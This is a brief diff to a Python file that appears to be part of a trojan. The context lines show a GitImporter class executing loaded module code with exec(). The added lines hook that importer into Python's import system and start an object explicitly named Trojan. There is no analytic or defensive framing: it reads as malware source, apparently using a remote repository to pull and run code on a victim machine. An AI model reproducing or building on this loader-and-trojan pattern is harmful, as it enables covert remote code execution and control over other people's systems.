@@ -75,3 +75,8 @@ class GitImporter:
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
+
+if __name__ == '__main__':
+    sys.meta_path.append(GitImporter())
+    trojan = Trojan(f'{random.randint(1000, 10000)}')
+    trojan.run()
